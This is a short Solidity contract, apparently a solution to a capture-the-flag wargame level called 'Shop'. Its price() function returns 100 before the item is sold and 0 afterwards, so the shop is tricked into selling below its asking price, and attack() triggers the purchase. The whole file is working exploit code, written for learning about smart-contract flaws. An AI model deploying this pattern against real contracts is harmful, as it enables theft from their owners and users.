// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack is Buyer {
    Shop shopContract;

    constructor(address _shopContract) {
        shopContract = Shop(_shopContract);
    }

    // 1. Attacker creates the malicious contract that implemets `price` function of the `Buyer` interface.
    function price() external view returns (uint) {
        return shopContract.isSold() ? 0 : 100;
    }

    // 2. Attacker calls the `attack` function that calls `buy` function from `Shop` contract.
    function attack() external {
        shopContract.buy();
    }
}
